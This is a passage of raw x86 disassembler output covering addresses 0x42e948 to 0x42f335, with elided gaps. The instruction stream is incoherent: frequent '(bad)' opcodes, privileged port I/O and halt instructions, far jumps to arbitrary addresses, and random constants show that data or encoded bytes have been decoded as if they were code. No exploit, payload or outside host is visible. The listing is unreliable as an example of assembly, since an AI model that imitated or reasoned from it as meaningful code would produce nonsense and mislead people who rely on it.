  42e948:	test   BYTE PTR [eax],0x0
  42e94b:	add    BYTE PTR [edi],bh
  42e94d:	push   ds
  42e94e:	mov    WORD PTR [ecx+0x2b8a7320],?
  42e954:	xor    al,0xdd
  42e956:	mov    bl,0x79
  42e958:	or     eax,0xaa8c8e20
  42e95d:	imul   esp,DWORD PTR [ebx+ecx*1+0xa605d77],0xfffffff2
  42e965:	loope  0x42e934
  42e967:	ret    
  42e968:	loopne 0x42e8f3
  42e96a:	mov    ss:0x77a282e2,eax
  42e970:	loop   0x42e95b
  42e972:	pop    esi
  42e973:	leave  
  42e974:	mov    WORD PTR [edx+ecx*1],gs
  42e977:	loope  0x42e972
  42e979:	fldcw  WORD PTR [edi+0x60]
  42e97c:	pop    ebx
  42e97d:	mov    esi,0xed024ada
  42e982:	popa   
  42e983:	test   eax,0xf083f21b
  42e988:	xchg   ebx,eax
  42e989:	inc    edi
  42e98a:	mov    eax,ds:0xb5d2c507
  42e98f:	fimul  DWORD PTR [esi]
  42e991:	lahf   
  42e992:	mov    BYTE PTR [esi],0x7a
  42e995:	cmp    BYTE PTR [esi-0x7a589cdd],0x82
  42e99c:	jbe    0x42e9ee
  42e99e:	loopne 0x42e9d8
  42e9a0:	or     esi,DWORD PTR [ebp-0x1f630a7]
  42e9a6:	int3   
  42e9a7:	je     0x42e947
  42e9a9:	dec    ebp
  42e9aa:	mov    ds:0x1f7578d6,eax
  42e9af:	inc    edx
  42e9b0:	aad    0x71
  42e9b2:	shl    bh,0x2c
  42e9b5:	pop    edi
  42e9b6:	loop   0x42e9d0
  42e9b8:	jmp    0x1280:0x7f56c8c2
  42e9bf:	in     al,dx
  42e9c0:	ffree  st(5)
  42e9c2:	ja     0x42e959
  42e9c4:	shl    esp,cl
  42e9c6:	(bad)  
  42e9c7:	cli    
  42e9c8:	inc    ecx
  42e9c9:	mov    esp,0x12e21dad
  42e9ce:	pushf  
  42e9cf:	pushf  
  42e9d0:	test   al,0xc7
  42e9d2:	cmc    
  42e9d3:	xor    dh,BYTE PTR [esi+ecx*4]
  42e9d6:	fcomi  st,st(3)
  42e9d8:	je     0x42e98a
  42e9da:	jmp    0x8e5ea5bf
  42e9df:	stos   BYTE PTR es:[edi],al
  42e9e0:	ficomp DWORD PTR [ebp+ebp*1+0x5a]
  42e9e4:	sub    eax,ecx
  42e9e6:	test   eax,0x27fc3db1
  42e9eb:	and    al,0xb8
  42e9ed:	jns    0x42ea1c
  42e9ef:	inc    esp
  42e9f0:	or     BYTE PTR [ebp-0x75],bl
  42e9f3:	sub    BYTE PTR [ebp-0x7bafef1],dl
  42e9f9:	js     0x42e983
  42e9fb:	not    BYTE PTR [edx+edi*2-0xee7bcbe]
  42ea02:	test   DWORD PTR [edx],esp
  42ea04:	fwait
  42ea05:	push   ds
  42ea06:	pushf  
  42ea07:	clc    
  42ea08:	mov    esi,0x2ff47786
  42ea0d:	inc    eax
  42ea0e:	inc    edi
  42ea0f:	xlat   BYTE PTR ds:[ebx]
  42ea10:	call   0x731de2c1
  42ea15:	adc    al,0x70
  42ea17:	aad    0x2e
  42ea19:	shl    BYTE PTR [esi+0x1c],1
  42ea1c:	push   edi
  42ea1d:	fiadd  DWORD PTR [edi]
  42ea1f:	cmc    
  42ea20:	aaa    
  42ea21:	dec    edx
  42ea22:	test   eax,0x4816e452
  42ea27:	mov    DWORD PTR [ebp+0x2b3ae9],ebp
  42ea2d:	scas   al,BYTE PTR es:[edi]
  42ea2e:	scas   eax,DWORD PTR es:[edi]
  42ea2f:	mov    bh,0x92
  42ea31:	cmp    dl,BYTE PTR [edi]
  42ea33:	push   edx
  42ea34:	stos   BYTE PTR es:[edi],al
  42ea35:	cmp    eax,0x7441b8ee
  42ea3a:	add    DWORD PTR ds:0xb5115ea4,0x9177
	...
  42eab4:	mov    al,0x7a
  42eab6:	pop    ds
  42eab7:	ins    BYTE PTR es:[edi],dx
  42eab8:	fild   QWORD PTR [ebp-0xd]
  42eabb:	dec    BYTE PTR [ebx]
  42eabd:	add    ah,BYTE PTR [ebp-0x48]
  42eac0:	std    
  42eac1:	retf   0xb20b
  42eac4:	into   
  42eac5:	in     eax,dx
  42eac6:	add    DWORD PTR [eax],eax
  42eac8:	test   BYTE PTR [eax],0x0
  42eacb:	add    BYTE PTR [esi],al
  42eacd:	pop    edx
  42eace:	je     0x42eb08
  42ead0:	cmp    al,0x62
  42ead2:	pop    esp
  42ead3:	push   esi
  42ead4:	cwde   
  42ead5:	xor    al,0x5a
  42ead7:	test   eax,0xa9761a42
  42eadc:	sbb    al,0x84
  42eade:	leave  
  42eadf:	call   0x12d3d104
  42eae4:	cwde   
  42eae5:	or     eax,0x1f77e1a7
  42eaea:	xor    BYTE PTR [esi+0x2a0f1331],cl
  42eaf0:	pop    ss
  42eaf1:	xchg   DWORD PTR [edx-0x3f],ebp
  42eaf4:	sbb    DWORD PTR [ebx+0x2f],eax
  42eaf7:	mov    bl,0x86
  42eaf9:	stos   BYTE PTR es:[edi],al
  42eafa:	xor    edx,DWORD PTR [ecx+0x6c]
  42eafd:	loope  0x42eaf8
  42eaff:	cli    
  42eb00:	lahf   
  42eb01:	cmc    
  42eb02:	push   edi
  42eb03:	jae    0x42eb1a
  42eb05:	jg     0x42eb82
  42eb07:	shr    DWORD PTR [edx+0x9],cl
  42eb0a:	pop    es
  42eb0b:	pop    ebp
  42eb0c:	dec    ebx
  42eb0d:	test   BYTE PTR [ebx],al
  42eb0f:	mov    ah,ch
  42eb11:	mov    cl,0x48
  42eb13:	adc    BYTE PTR [ebp+0x2fe2c927],dh
  42eb19:	add    cl,0xdf
  42eb1c:	mov    esp,0xf789a070
  42eb21:	aaa    
  42eb22:	or     cl,BYTE PTR [ebx-0x39120dae]
  42eb28:	push   0x49
  42eb2a:	cmp    ecx,eax
  42eb2c:	xchg   DWORD PTR [esi],esp
  42eb2e:	pop    eax
  42eb2f:	fsub   QWORD PTR [edi]
  42eb31:	push   esi
  42eb32:	addr16 push cs
  42eb34:	inc    esp
  42eb35:	nop
  42eb36:	hlt    
  42eb37:	add    al,0xb4
  42eb39:	mov    cl,0x6c
  42eb3b:	mov    ds:0x1e4a8f2c,eax
  42eb40:	inc    ebx
  42eb41:	ss hlt 
  42eb43:	cdq    
  42eb44:	fdiv   DWORD PTR [esp+edx*4+0x2a8642ed]
  42eb4b:	xchg   ecx,eax
  42eb4c:	mov    esi,0xf3811170
  42eb51:	jmp    0x42eb5e
  42eb53:	push   0xffffffdf
  42eb55:	cld    
  42eb56:	mov    ah,0xc6
  42eb58:	(bad)  
  42eb59:	dec    eax
  42eb5a:	cmp    eax,0x9d94d3b4
  42eb5f:	pop    ds
  42eb60:	pushf  
  42eb61:	sahf   
  42eb62:	mov    ecx,0x5edbf40c
  42eb67:	xlat   BYTE PTR ds:[ebx]
  42eb68:	fincstp 
  42eb6a:	dec    esi
  42eb6b:	(bad)  
  42eb6c:	mov    WORD PTR [eax+0x469689a0],es
  42eb72:	imul   edi,DWORD PTR [eax+0x7a],0xb839643f
  42eb79:	mov    dh,0xaa
  42eb7b:	sbb    BYTE PTR [esi-0x48],cl
  42eb7e:	nop
  42eb7f:	xor    dh,dh
  42eb81:	inc    BYTE PTR [ebp-0x1e]
  42eb84:	push   esp
  42eb85:	xchg   esp,eax
  42eb86:	mov    esp,0x834588c3
  42eb8b:	jns    0x42eb77
  42eb8d:	xor    eax,0xd094fba7
  42eb92:	mov    ah,0xdb
  42eb94:	jmp    0x3a24:0x358de9f9
  42eb9b:	data16 mov BYTE PTR [edx-0x18],dh
  42eb9f:	shl    BYTE PTR [esi+esi*1-0x51],cl
  42eba3:	inc    eax
  42eba4:	nop
  42eba5:	mov    edi,DWORD PTR [esi+0x429a7241]
  42ebab:	test   BYTE PTR ds:[eax+0x38],al
  42ebaf:	push   ds
  42ebb0:	popf   
  42ebb1:	ins    BYTE PTR es:[edi],dx
  42ebb2:	xlat   BYTE PTR ds:[ebx]
  42ebb3:	inc    edi
  42ebb4:	sub    al,0xf0
  42ebb6:	hlt    
  42ebb7:	inc    ebp
  42ebb8:	dec    ebx
  42ebb9:	or     BYTE PTR [ebx-0x4d],dh
  42ebbc:	pop    eax
  42ebbd:	push   0x4766885c
	...
  42ec32:	add    BYTE PTR [eax],al
  42ec34:	cmp    DWORD PTR [edi-0x2010f093],esi
  42ec3a:	jnp    0x42ebf3
  42ec3c:	sbb    cl,BYTE PTR [edi+edx*4-0x362cc597]
  42ec43:	jge    0x42ec09
  42ec45:	out    dx,al
  42ec46:	add    DWORD PTR [eax],eax
  42ec48:	test   BYTE PTR [eax],0x0
  42ec4b:	add    BYTE PTR [edi+0x60],dh
  42ec4e:	jbe    0x42ecc0
  42ec50:	in     eax,0xaf
  42ec52:	in     al,dx
  42ec53:	mov    dh,0x8c
  42ec55:	(bad)  
  42ec56:	sub    BYTE PTR [edi+esi*1],ch
  42ec59:	stos   BYTE PTR es:[edi],al
  42ec5a:	mov    ch,0xc5
  42ec5c:	shl    dh,cl
  42ec5e:	fld    st(5)
  42ec60:	adc    edi,DWORD PTR ds:0x88ba4f0f
  42ec66:	mov    edx,?
  42ec68:	(bad)  
  42ec69:	adc    bh,BYTE PTR [edx]
  42ec6b:	stc    
  42ec6c:	fist   DWORD PTR ds:0x5d87a9f9
  42ec72:	pusha  
  42ec73:	cli    
  42ec74:	loop   0x42ec35
  42ec76:	pop    esp
  42ec77:	mov    WORD PTR [ecx],?
  42ec79:	dec    ebp
  42ec7a:	lods   al,BYTE PTR ds:[esi]
  42ec7b:	iret   
  42ec7c:	fld    st(0)
  42ec7e:	fld    DWORD PTR [eax]
  42ec80:	sti    
  42ec81:	scas   eax,DWORD PTR es:[edi]
  42ec82:	hlt    
  42ec83:	mov    ah,0xa8
  42ec85:	ret    
  42ec86:	push   edi
  42ec87:	enter  0xdb37,0x27
  42ec8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec8c:	xor    al,0xea
  42ec8e:	fiadd  WORD PTR [edi+0x975222d]
  42ec94:	ins    DWORD PTR es:[edi],dx
  42ec95:	mov    cs,WORD PTR [ebp+0x41]
  42ec98:	sub    BYTE PTR [ecx],al
  42ec9a:	test   eax,0xd29f0250
  42ec9f:	or     DWORD PTR [ebx+0x6b],ecx
  42eca2:	lock jo 0x42ec6a
  42eca5:	adc    ebx,DWORD PTR [ebx+0x22b38ce3]
  42ecab:	lds    ecx,FWORD PTR [edx-0x2e]
  42ecae:	pop    esp
  42ecaf:	pop    ss
  42ecb0:	mov    ds:0xe2ebe3ec,eax
  42ecb5:	or     DWORD PTR ds:0xd0bcfc04,esi
  42ecbb:	xchg   ebx,eax
  42ecbc:	rcr    DWORD PTR [edi+0x30],0x71
  42ecc0:	cs mov edi,0x8906f65
  42ecc6:	test   BYTE PTR [edx+edx*2-0xc],0xad
  42eccb:	outs   dx,DWORD PTR ds:[esi]
  42eccc:	pop    ds
  42eccd:	sti    
  42ecce:	sub    BYTE PTR ds:0x5d8bcc27,dl
  42ecd4:	add    DWORD PTR [ebx-0x6847b824],edi
  42ecda:	add    bl,dl
  42ecdc:	loop   0x42ed42
  42ecde:	add    al,0xb6
  42ece0:	mov    DWORD PTR [eax],ebx
  42ece2:	push   0xbc8abb27
  42ece7:	icebp  
  42ece8:	ds and al,0x9b
  42eceb:	mov    edx,edi
  42eced:	loop   0x42ed25
  42ecef:	dec    ecx
  42ecf0:	mov    al,ds:0x6d79f5b
  42ecf5:	cmp    eax,0x7767df84
  42ecfa:	push   0xca77398b
  42ecff:	dec    esi
  42ed00:	jae    0x42ed3a
  42ed02:	lahf   
  42ed03:	cdq    
  42ed04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ed05:	out    0xa3,al
  42ed07:	std    
  42ed08:	fs in  al,0xc6
  42ed0b:	xor    DWORD PTR [ecx+eax*4+0x62],0xffffffc9
  42ed10:	in     eax,0x9
  42ed12:	xchg   ebx,eax
  42ed13:	mov    eax,0x72b8e003
  42ed18:	mov    ds:0x3c4dd11,al
  42ed1d:	push   cs
  42ed1e:	out    dx,al
  42ed1f:	in     eax,0x16
  42ed21:	jbe    0x42ed32
  42ed23:	push   edx
  42ed24:	jmp    FWORD PTR [ebx-0x14]
  42ed27:	adc    BYTE PTR [edi],dl
  42ed29:	pop    esi
  42ed2a:	std    
  42ed2b:	les    ecx,FWORD PTR [esi]
  42ed2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ed2e:	ficom  WORD PTR [eax]
  42ed30:	mov    esp,0x8e8fe4f2
  42ed35:	in     eax,0x3f
  42ed37:	into   
  42ed38:	in     al,dx
  42ed39:	mov    dh,0x43
  42ed3b:	ins    BYTE PTR es:[edi],dx
  42ed3c:	inc    edx
  42ed3d:	jmp    0xc4254d81
	...
  42edb2:	add    BYTE PTR [eax],al
  42edb4:	out    0x82,al
  42edb6:	lods   eax,DWORD PTR ds:[esi]
  42edb7:	xor    ebp,ebp
  42edb9:	aas    
  42edba:	(bad)  
  42edbb:	xlat   BYTE PTR ds:[ebx]
  42edbc:	jmp    0x42ed84
  42edbe:	popa   
  42edbf:	test   eax,0x14ddd439
  42edc4:	mov    edx,0xf60001ef
  42edc9:	add    BYTE PTR [eax],al
  42edcb:	add    bl,cl
  42edcd:	bound  ecx,QWORD PTR [edi+0x5ae7718e]
  42edd3:	fisttp DWORD PTR [ecx+0x1a290c17]
  42edd9:	(bad)  
  42edda:	push   ds
  42eddb:	loopne 0x42edd9
  42eddd:	ret    
  42edde:	mov    ebp,0xd8755308
  42ede3:	pop    edi
  42ede4:	fdiv   QWORD PTR [ebp-0x39bd37ea]
  42edea:	mov    edx,0x145ee982
  42edef:	ins    BYTE PTR es:[edi],dx
  42edf0:	pop    esp
  42edf1:	loop   0x42edbd
  42edf3:	fst    QWORD PTR [eax-0x1f4ecd10]
  42edf9:	sbb    DWORD PTR [ebx+ebp*2-0x49],edi
  42edfd:	mov    al,0x49
  42edff:	sub    ch,BYTE PTR [ecx-0x1c]
  42ee02:	push   ebp
  42ee03:	pop    ebx
  42ee04:	pop    esp
  42ee05:	cdq    
  42ee06:	sbb    DWORD PTR [ebx+0x2f],esi
  42ee09:	loop   0x42ee77
  42ee0b:	mov    dl,0xa7
  42ee0d:	pop    es
  42ee0e:	add    dh,bl
  42ee10:	jno    0x42eda6
  42ee12:	adc    al,0x2e
  42ee14:	(bad)  
  42ee15:	mov    esp,0x41583079
  42ee1a:	mov    ebx,0xdb53964
  42ee1f:	int    0xb6
  42ee21:	mov    al,ds:0x9d351fbc
  42ee26:	aad    0x3e
  42ee28:	pop    ecx
  42ee29:	mov    dh,0xae
  42ee2b:	repnz mov eax,ds:0xc8221930
  42ee31:	pusha  
  42ee32:	cwde   
  42ee33:	shl    BYTE PTR ds:0x730e4d98,1
  42ee39:	pop    edi
  42ee3a:	xor    DWORD PTR [eax+0x3c7776f8],ebx
  42ee40:	lock xor bl,BYTE PTR [esi-0x8]
  42ee44:	add    edi,DWORD PTR [ebp+0x4d]
  42ee47:	js     0x42ee70
  42ee49:	push   edi
  42ee4a:	out    dx,al
  42ee4b:	dec    ebx
  42ee4c:	into   
  42ee4d:	shr    eax,cl
  42ee4f:	fst    QWORD PTR [eax+0x59]
  42ee52:	loopne 0x42edee
  42ee54:	mov    cl,0x5b
  42ee56:	inc    BYTE PTR [ebp-0xde01ee5]
  42ee5c:	push   es
  42ee5d:	sub    BYTE PTR [ebx+0x41b9d571],dl
  42ee63:	gs out 0x91,eax
  42ee66:	pushf  
  42ee67:	push   esp
  42ee68:	loop   0x42ee02
  42ee6a:	cld    
  42ee6b:	not    DWORD PTR [eax-0x65f519b1]
  42ee71:	jns    0x42ee90
  42ee73:	stos   DWORD PTR es:[edi],eax
  42ee74:	rcr    BYTE PTR [ecx+0x3],0x36
  42ee78:	cmp    DWORD PTR [eax-0x32e47ac0],ebp
  42ee7e:	(bad)  [edx-0x4b2cb820]
  42ee84:	sub    DWORD PTR [eax-0x28],0x2b77f9a3
  42ee8b:	dec    ecx
  42ee8c:	ret    0xc715
  42ee8f:	xlat   BYTE PTR ds:[ebx]
  42ee90:	or     ebp,DWORD PTR [edi-0x44]
  42ee93:	or     al,0xb2
  42ee95:	stos   DWORD PTR es:[edi],eax
  42ee96:	bound  edi,QWORD PTR [esi+0x535c3569]
  42ee9c:	out    dx,eax
  42ee9d:	leave  
  42ee9e:	ret    
  42ee9f:	pop    es
  42eea0:	push   edx
  42eea1:	out    0x71,al
  42eea3:	in     eax,dx
  42eea4:	jmp    0x42eed3
  42eea6:	loope  0x42ee7b
  42eea8:	sub    BYTE PTR [esp+esi*2+0x7d],ah
  42eeac:	jl     0x42eec3
  42eeae:	(bad)  
  42eeaf:	mov    bh,0x2f
  42eeb1:	pop    ecx
  42eeb2:	xor    eax,0x105f976f
  42eeb7:	xor    DWORD PTR [bp+0x120c],0x2
  42eebd:	popa   
  42eebe:	in     eax,dx
  42eebf:	aam    0xcb
  42eec1:	inc    BYTE PTR [eax]
	...
  42ef33:	add    BYTE PTR [edx],al
  42ef35:	(bad)  
  42ef36:	jb     0x42eede
  42ef38:	(bad)  
  42ef39:	scas   al,BYTE PTR es:[edi]
  42ef3a:	(bad)  
  42ef3b:	(bad)  
  42ef3c:	cmp    DWORD PTR [edi],edi
  42ef3e:	int3   
  42ef3f:	repnz push 0xb0fc49ac
  42ef45:	lock add DWORD PTR [eax],eax
  42ef48:	test   BYTE PTR [eax],0x0
  42ef4b:	add    ah,bh
  42ef4d:	sub    bl,BYTE PTR [edi]
  42ef4f:	sbb    al,0xe6
  42ef51:	pusha  
  42ef52:	lds    ebp,FWORD PTR [ecx-0x2ccda620]
  42ef58:	lock pop ds
  42ef5a:	cmp    ah,BYTE PTR [ecx-0x6a9415a6]
  42ef60:	pop    esi
  42ef61:	call   0x649b:0xa3a06181
  42ef68:	stc    
  42ef69:	arpl   WORD PTR [eax+0x2f7846e3],di
  42ef6f:	das    
  42ef70:	inc    ebp
  42ef71:	cmp    al,0x78
  42ef73:	mov    edx,0x4d89d31a
  42ef79:	jle    0x42ef46
  42ef7b:	repz sbb ah,BYTE PTR [eax]
  42ef7e:	mov    ds:0x29f25e38,eax
  42ef83:	scas   eax,DWORD PTR es:[edi]
  42ef84:	fld    st(3)
  42ef86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ef87:	jl     0x42f001
  42ef89:	sub    DWORD PTR [ebx-0x34],ebp
  42ef8c:	dec    esi
  42ef8d:	mov    edi,0xe9627c35
  42ef92:	jecxz  0x42f00e
  42ef94:	or     BYTE PTR [ebx],al
  42ef96:	aam    0x4e
  42ef98:	add    cl,bl
  42ef9a:	popf   
  42ef9b:	mov    edx,DWORD PTR [edi]
  42ef9d:	xor    ch,BYTE PTR [edi+0x4622d972]
  42efa3:	and    al,0x6
  42efa5:	sub    BYTE PTR [esi],dl
  42efa7:	jmp    0x3a59:0x74a5855c
  42efae:	mov    al,0x77
  42efb0:	les    ebx,FWORD PTR [esi+0x77]
  42efb3:	retf   
  42efb4:	loope  0x42efa4
  42efb6:	mov    edx,0x9e091e77
  42efbb:	in     al,dx
  42efbc:	dec    BYTE PTR [ebx]
  42efbe:	sbb    eax,0x9c15dddb
  42efc3:	inc    edx
  42efc4:	imul   ecx,DWORD PTR [eax-0x2d],0x34a13b32
  42efcb:	cmp    DWORD PTR [edx+0x36],ebp
  42efce:	scas   al,BYTE PTR es:[edi]
  42efcf:	xchg   ebx,eax
  42efd0:	sub    bh,ch
  42efd2:	pop    esi
  42efd3:	pop    ds
  42efd4:	sbb    DWORD PTR [ebp-0x18dd0d31],eax
  42efda:	test   BYTE PTR [esi],bh
  42efdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42efdd:	push   ds
  42efde:	xor    al,0x6a
  42efe0:	cld    
  42efe1:	pop    ecx
  42efe2:	cmp    dl,BYTE PTR [ebx-0x56]
  42efe5:	mov    gs,WORD PTR [eax-0x4a97c72a]
  42efeb:	xchg   edx,eax
  42efec:	repnz lods eax,DWORD PTR ds:[si]
  42efef:	aam    0x7e
  42eff1:	add    DWORD PTR [ecx+ebx*2-0x6427b9e7],0xaeb98ef0
  42effc:	ret    0x6d24
  42efff:	jge    0x42f01d
  42f001:	pop    ecx
  42f002:	dec    ebp
  42f003:	cld    
  42f004:	out    dx,al
  42f005:	lods   eax,DWORD PTR ss:[esi]
  42f007:	loopne 0x42efac
  42f009:	jmp    FWORD PTR [ebx]
  42f00b:	dec    ecx
  42f00c:	adc    bh,BYTE PTR [edx-0x18d2e2d2]
  42f012:	and    al,0xc
  42f014:	sbb    al,ah
  42f016:	cmp    BYTE PTR [ecx-0x48],cl
  42f019:	sbb    edx,DWORD PTR es:[esp+eax*2+0x406896dc]
  42f021:	push   edx
  42f022:	mov    bh,0xf5
  42f024:	inc    ebp
  42f025:	mov    DWORD PTR fs:[esi],ebp
  42f028:	or     al,0x6b
  42f02a:	scas   eax,DWORD PTR es:[edi]
  42f02b:	test   DWORD PTR [esi+0x5c],ebp
  42f02e:	gs xchg ecx,eax
  42f030:	mov    dl,0xbb
  42f032:	aas    
  42f033:	jmp    0x42effa
  42f035:	outs   dx,BYTE PTR ds:[esi]
  42f036:	jb     0x42f039
  42f038:	or     esi,DWORD PTR [ebp-0x24]
  42f03b:	(bad)  
  42f03c:	pusha  
  42f03d:	jmp    0x42f046
  42f03f:	test   dh,ah
  42f041:	jmp    0x42f043
	...
  42f0b3:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42f0b9:	xlat   BYTE PTR ds:[ebx]
  42f0ba:	mov    ecx,0xd7e009ef
  42f0bf:	bound  eax,QWORD PTR ds:0xa6b8ec55
  42f0c5:	icebp  
  42f0c6:	add    DWORD PTR [eax],eax
  42f0c8:	test   BYTE PTR [eax],0x0
  42f0cb:	add    BYTE PTR [edi-0x589b4d82],bh
  42f0d1:	xor    eax,0xb9f7c64b
  42f0d6:	push   ebx
  42f0d7:	mov    ebx,edi
  42f0d9:	mov    bl,0x17
  42f0db:	mov    edx,0xdddda3df
  42f0e0:	pusha  
  42f0e1:	(bad)  
  42f0e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f0e3:	xchg   esp,eax
  42f0e4:	xchg   ebp,eax
  42f0e5:	pop    ss
  42f0e6:	inc    eax
  42f0e7:	push   ebx
  42f0e8:	jg     0x42f12f
  42f0ea:	adc    bl,BYTE PTR [edi-0x76]
  42f0ed:	pop    edx
  42f0ee:	outs   dx,BYTE PTR ds:[esi]
  42f0ef:	sbb    BYTE PTR [ebp+0x16],cl
  42f0f2:	xchg   DWORD PTR [edi-0x7c7bc4dc],edx
  42f0f8:	(bad)  ds:0x549ee3e9
  42f0fe:	cmp    ecx,DWORD PTR [eax-0x43264adc]
  42f104:	jle    0x42f127
  42f106:	bound  ebp,QWORD PTR [ebp+0x28]
  42f109:	into   
  42f10a:	jne    0x42f0d9
  42f10c:	or     ebp,DWORD PTR [ebp-0x17]
  42f10f:	dec    edi
  42f110:	mov    ah,BYTE PTR [ebx-0x5d]
  42f113:	cmp    ebp,ebp
  42f115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f116:	cwde   
  42f117:	test   eax,0xb32d938e
  42f11c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f11d:	push   ebx
  42f11e:	sub    dh,dl
  42f120:	retf   0x34d7
  42f123:	push   esi
  42f124:	or     BYTE PTR [ebx-0x18cc01fe],dh
  42f12a:	ficomp WORD PTR ds:0x99eaf0f2
  42f130:	js     0x42f109
  42f132:	mov    ecx,0xa22e92fa
  42f137:	inc    edi
  42f138:	xor    DWORD PTR [edi-0x43],edx
  42f13b:	test   BYTE PTR [esi-0xd],0x2f
  42f13f:	jmp    0x42f15c
  42f141:	cmp    al,0xb
  42f143:	sub    eax,0x2d956ae8
  42f148:	jmp    0x42f0eb
  42f14a:	fild   WORD PTR [edx+ebx*2]
  42f14d:	popa   
  42f14e:	push   esi
  42f14f:	push   ecx
  42f150:	imul   ecx,DWORD PTR [esp+esi*8-0x320479fe],0x1e207d27
  42f15b:	lock std 
  42f15d:	cld    
  42f15e:	sub    al,0x71
  42f160:	push   edx
  42f161:	or     eax,DWORD PTR [ebx+eiz*2-0x3aeeb7ec]
  42f168:	leave  
  42f169:	push   ds
  42f16a:	mov    ebx,ebp
  42f16c:	arpl   WORD PTR [edi],sp
  42f16e:	outs   dx,BYTE PTR ds:[esi]
  42f16f:	in     eax,dx
  42f170:	loope  0x42f139
  42f172:	mov    ah,0xe0
  42f174:	cmc    
  42f175:	and    BYTE PTR [ebx+esi*4],0xbb
  42f179:	mov    bl,BYTE PTR [ecx]
  42f17b:	mov    al,0xf7
  42f17d:	jnp    0x42f1fe
  42f17f:	sub    ah,0x63
  42f182:	lods   eax,DWORD PTR ds:[esi]
  42f183:	or     bh,bl
  42f185:	xchg   ebp,eax
  42f186:	arpl   WORD PTR [ebx+0x2d8d2fdd],si
  42f18c:	xchg   esi,eax
  42f18d:	and    BYTE PTR [edi-0x5fef9437],ah
  42f193:	adc    eax,0x1136d975
  42f198:	sbb    DWORD PTR [esi-0x3304d8ed],edx
  42f19e:	cmp    bl,BYTE PTR [ebx+0x1d]
  42f1a1:	mov    ebx,edx
  42f1a3:	pop    ebx
  42f1a4:	fcmovnbe st,st(4)
  42f1a6:	mov    bh,0xab
  42f1a8:	rcr    ecx,1
  42f1aa:	add    eax,0xb408dfe0
  42f1af:	bound  ebp,QWORD PTR [edi+ebx*4+0x2e55a9fe]
  42f1b6:	mov    ch,0xda
  42f1b8:	mov    bh,0x35
  42f1ba:	jne    0x42f14e
  42f1bc:	les    edx,FWORD PTR [edx+esi*8+0x585078]
	...
  42f233:	add    BYTE PTR [ebp-0x655875c3],ch
  42f239:	mov    bh,0xad
  42f23b:	aas    
  42f23c:	jp     0x42f245
  42f23e:	int3   
  42f23f:	icebp  
  42f240:	push   cs
  42f241:	sbb    DWORD PTR [edi+0x1f29c66],ebp
  42f247:	add    dh,dh
  42f249:	add    BYTE PTR [eax],al
  42f24b:	add    BYTE PTR ds:0xc554204c,cl
  42f251:	iret   
  42f252:	out    0x45,al
  42f254:	xlat   BYTE PTR ds:[ebx]
  42f255:	fcmovnb st,st(6)
  42f257:	js     0x42f2a4
  42f259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f25a:	ds std 
  42f25c:	adc    bh,BYTE PTR [esi]
  42f25e:	mov    bh,0xf7
  42f260:	loopne 0x42f2dd
  42f262:	lods   al,BYTE PTR ds:[esi]
  42f263:	inc    edi
  42f264:	mov    ds:0xce53eafe,al
  42f269:	jg     0x42f24f
  42f26b:	call   0xccbd0a27
  42f270:	mov    eax,0x5f9bb35a
  42f275:	js     0x42f2da
  42f277:	pop    edi
  42f278:	sub    BYTE PTR [edi+0x64],bl
  42f27b:	inc    ecx
  42f27c:	cmp    DWORD PTR [ecx+0x77],0x7c3eba81
  42f283:	dec    esp
  42f284:	shl    BYTE PTR [ebx-0x12c169f8],cl
  42f28a:	mov    edx,0xcf1cfff6
  42f28f:	sbb    ah,BYTE PTR [ecx-0x3a8fb1a7]
  42f295:	mov    al,0x9e
  42f297:	not    DWORD PTR [esi+esi*2+0x525c1f2]
  42f29e:	dec    edi
  42f29f:	cli    
  42f2a0:	aaa    
  42f2a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f2a2:	cmp    eax,0xc0824812
  42f2a7:	enter  0x1ed5,0x5a
  42f2ab:	pop    ebp
  42f2ac:	xor    BYTE PTR [edi+0x91e8c77],0xce
  42f2b3:	push   eax
  42f2b4:	fidiv  DWORD PTR [ecx+0x48]
  42f2b7:	loop   0x42f23f
  42f2b9:	test   esi,0xf047b6c9
  42f2bf:	popf   
  42f2c0:	iret   
  42f2c1:	shl    BYTE PTR [ebx-0x46],0xc4
  42f2c5:	hlt    
  42f2c6:	mov    ch,0xc7
  42f2c8:	jmp    0x550da125
  42f2cd:	pop    ebp
  42f2ce:	push   eax
  42f2cf:	fst    st(5)
  42f2d1:	xor    dh,BYTE PTR [edx+0x1ae68907]
  42f2d7:	scas   eax,DWORD PTR es:[edi]
  42f2d8:	inc    eax
  42f2d9:	sbb    ah,BYTE PTR [eax-0xddbfb67]
  42f2df:	out    0x6f,al
  42f2e1:	jle    0x42f278
  42f2e3:	mov    fs,WORD PTR ds:[ecx]
  42f2e6:	out    dx,al
  42f2e7:	mov    al,0xfe
  42f2e9:	fimul  WORD PTR [ebp+0xb1837b5]
  42f2f0:	sbb    al,0x89
  42f2f2:	and    al,0x1d
  42f2f4:	cmp    esp,DWORD PTR [edx-0x19e2406]
  42f2fa:	jg     0x42f2c1
  42f2fc:	loope  0x42f2fa
  42f2fe:	pop    es
  42f2ff:	fsub   DWORD PTR [edx+edx*8+0x64829fdb]
  42f306:	lods   al,BYTE PTR ds:[esi]
  42f307:	or     esp,eax
  42f309:	outs   dx,BYTE PTR ds:[esi]
  42f30a:	(bad)  
  42f30b:	or     bl,BYTE PTR [esi+0x331b5373]
  42f311:	fwait
  42f312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f313:	fadd   DWORD PTR [edx+0x77232a5f]
  42f319:	dec    esi
  42f31a:	cwde   
  42f31b:	jp     0x42f2d0
  42f31d:	call   0x78f5:0x7a155799
  42f324:	xchg   edi,eax
  42f325:	sar    DWORD PTR [eax],0x43
  42f328:	add    ch,al
  42f32a:	neg    BYTE PTR [ebx+0x59]
  42f32d:	in     eax,dx
  42f32e:	pop    edi
  42f32f:	enter  0xa822,0x21
  42f333:	jno    0x42f377
  42f335:	fadd   DWORD PTR [eax+0x72464a57]
